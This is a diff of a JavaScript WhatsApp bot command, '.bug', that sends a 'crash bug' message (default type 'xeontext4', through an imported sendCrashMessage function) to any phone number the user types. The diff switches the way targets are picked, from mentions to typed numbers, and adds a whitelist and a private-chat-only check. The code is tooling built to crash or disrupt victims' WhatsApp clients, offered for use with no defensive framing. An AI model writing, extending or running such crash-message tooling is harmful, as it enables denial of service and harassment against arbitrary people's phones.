@@ -1,46 +1,86 @@
-const { sendCrashMessage } = require('../lib/bugfunctions')
+const fs = require('fs');
+const path = require('path');
+const { sendCrashMessage } = require('../lib/bugfunctions');
+
+// convert number → WhatsApp JID
+function toJid(number) {
+  return number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+}
+
+// check whitelist
+function isWhitelisted(senderNumber) {
+  try {
+    const whitelistPath = path.join(__dirname, '../whitelist.json');
+    const whitelist = JSON.parse(fs.readFileSync(whitelistPath));
+
+    return whitelist.includes(senderNumber);
+  } catch (err) {
+    console.error('Whitelist error:', err);
+    return false;
+  }
+}
 
 async function bugCommand(sock, chatId, message) {
   try {
-    const rawText = message.message?.conversation || 
-                   message.message?.extendedTextMessage?.text || ""
-    const parts = rawText.trim().split(/\s+/)
-    
-    // Get mentioned users
-    const mentionedJid = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || []
-    const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage
-    
-    // Determine target
-    let target = null
-    if (mentionedJid.length > 0) {
-      target = mentionedJid[0]
-    } else if (quotedMessage) {
-      target = quotedMessage.participant || message.quoted.sender
-    } else {
-      await sock.sendMessage(chatId, {
-        text: '❌ Please mention or quote a user to send bug'
-      }, { quoted: message })
-      return
+    // ❌ Block group usage
+    const isGroup = chatId.endsWith('@g.us');
+    if (isGroup) {
+      return sock.sendMessage(chatId, {
+        text: '❌ This command works only in private chat'
+      }, { quoted: message });
     }
-    
-    // Get bug type (optional argument)
-    const bugType = parts[1] || 'xeontext4'
-    
+
+    // get message text
+    const rawText =
+      message.message?.conversation ||
+      message.message?.extendedTextMessage?.text ||
+      "";
+
+    const args = rawText.trim().split(/\s+/);
+
+    // get sender number
+    const sender =
+      message.key.participant || message.key.remoteJid;
+
+    const senderNumber = sender.split('@')[0];
+
+    // ❌ check whitelist
+    if (!isWhitelisted(senderNumber)) {
+      return sock.sendMessage(chatId, {
+        text: '❌ You are not whitelisted to use this command'
+      }, { quoted: message });
+    }
+
+    // get target number
+    const number = args[1];
+
+    if (!number) {
+      return sock.sendMessage(chatId, {
+        text: '❌ Usage: .bug 2547xxxxxxx'
+      }, { quoted: message });
+    }
+
+    const target = toJid(number);
+
+    // optional bug type
+    const bugType = args[2] || 'xeontext4';
+
     await sock.sendMessage(chatId, {
-      text: `⏳ Sending crash bug to @${target.split('@')[0]}...`
-    }, { quoted: message })
-    
-    await sendCrashMessage(sock, target, bugType)
-    
+      text: `⏳ Sending bug to ${number}...`
+    }, { quoted: message });
+
+    await sendCrashMessage(sock, target, bugType);
+
     await sock.sendMessage(chatId, {
-      text: `✅ Crash bug sent successfully!`
-    }, { quoted: message })
-    
+      text: `✅ Bug sent to ${number}`
+    }, { quoted: message });
+
   } catch (error) {
-    console.error('Bug Command Error:', error.message)
+    console.error('Bug Command Error:', error);
+
     await sock.sendMessage(chatId, {
       text: `❌ Error: ${error.message}`
-    }, { quoted: message }).catch(() => {})
+    }, { quoted: message }).catch(() => {});
   }
 }
 
